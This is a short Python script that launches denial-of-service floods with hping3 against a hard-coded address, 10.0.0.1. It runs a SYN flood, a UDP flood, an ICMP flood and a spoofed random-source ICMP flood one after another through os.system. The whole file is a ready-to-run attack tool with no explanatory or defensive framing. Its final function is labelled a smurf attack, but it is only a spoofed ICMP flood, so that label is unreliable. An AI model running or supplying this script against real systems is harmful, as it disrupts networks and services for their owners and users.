import os
import time

# Target IP address
IP_ADDR = "10.0.0.1"



def syn_flood(ip_addr):
    command = "hping3 --syn --setack 0 -c 500 -i u1 {}".format(ip_addr)
    print("SYN flood on {}".format(ip_addr))
    print("command: {}".format(command))
    os.system(command)


def udp_flood(ip_addr):
    command = "hping3 --udp -c 500 -i u1 {}".format(ip_addr)
    print("UDP flood on {}".format(ip_addr))
    print("command: {}".format(command))
    os.system(command)


def icmp_flood(ip_addr):
    command = "hping3 --icmp -c 500 -i u1 {}".format(ip_addr)
    print("ICMP flood on {}".format(ip_addr))
    print("command: {}".format(command))
    os.system(command)


def smurf_attack(ip_addr):
    command = "hping3 --rand-source --icmp -c 500 -i u1 {}".format(ip_addr)
    print("Smurf Attack on {}".format(ip_addr))
    print("command: {}".format(command))
    os.system(command)


if __name__ == "__main__":
    syn_flood(IP_ADDR)
    time.sleep(10)
    udp_flood(IP_ADDR)
    time.sleep(10)
    icmp_flood(IP_ADDR)
    time.sleep(10)
    smurf_attack(IP_ADDR)
